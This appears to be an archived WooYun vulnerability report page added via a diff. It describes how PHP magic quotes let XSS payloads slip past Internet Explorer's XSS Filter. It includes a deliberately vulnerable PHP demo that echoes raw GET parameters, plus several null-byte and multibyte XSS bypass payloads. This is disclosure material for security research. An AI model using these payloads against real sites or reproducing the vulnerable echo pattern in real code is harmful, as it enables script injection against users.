@@ -1,0 +1,194 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		PHP魔术引号导致IE XSS Filter bypass  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		PHP魔术引号导致IE XSS Filter bypass  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Sogili">Sogili</a> 
+</li><li>提交时间：		2012-10-14 21:28</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-10-14：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2012-10-14：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">在一些web容器中会对一些特殊字符做转换处理,这中间ie xss filter开发人员任何地方对它的了解有疏忽,都很可能导致bypass. </p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">在php中,如果开启了”魔术引号”特性(magic_quotes_gpc = On),则‘ (single-quote), “ (double quote), \ (backslash) 和 NULL 字符将都会被反斜杠转义(%00 =&gt;\0). <br />
+<br />
+<br />
+<br />
+1. xss.php demo source code: <br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;?php echo $_GET[&#039;x&#039;]?&gt; <br />
+&lt;script type=&quot;text/javascript&quot;&gt; <br />
+var x=&quot;&lt;?php echo $_GET[&#039;z&#039;]?&gt;&quot; <br />
+&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+2. HTML bypass case: <br />
+<br />
+</p><pre><code>&lt;script&gt;alert(1)&lt;/script&gt;   <br />
+&lt;script/%00%00%00%00%00&gt;alert(1)&lt;/script&gt;   <br />
+%00%00v%00%00&lt;script&gt;alert(1)&lt;/script&gt;   <br />
+&lt;script/%00%00v%00%00&gt;alert(1)&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+tips: <br />
+<br />
+1. 绕过字符必须出现在拦截规则中,例如拦截&lt;script&gt;就可以是&lt;script [here]&gt;. <br />
+<br />
+<br />
+<br />
+3. Javascript bypass case: <br />
+<br />
+<br />
+<br />
+</p><pre><code>“;alert(1)//   <br />
+%c0″;alert(%00)//   <br />
+%c0″;//(%0dalert(1)//   <br />
+%c0″;//(%0dalert(1)//   <br />
+%c0″;//(%00%0dalert(1)//   <br />
+%c0″//(%000000%0dalert(1)//</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+tips: <br />
+<br />
+</p><pre><code>1. 需要通过多字节问题吃掉一个\. <br />
+2. //(%000000%0d是用于绕过函数调用的拦截规则.</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/14204757425b77f270426f6346a1080591a41f63.jpg" target="_blank"><img src="../images/14204757425b77f270426f6346a1080591a41f63.jpg" alt="" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail"> 加入%00 =&gt; \0 规则,当然这样可能还会产生别的问题 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Sogili" title="Sogili">Sogili</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-013352" title="PHP魔术引号导致IE XSS Filter bypass">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																<p class="detail">漏洞Rank：18 (WooYun评价)</p>
+												
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="13352";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
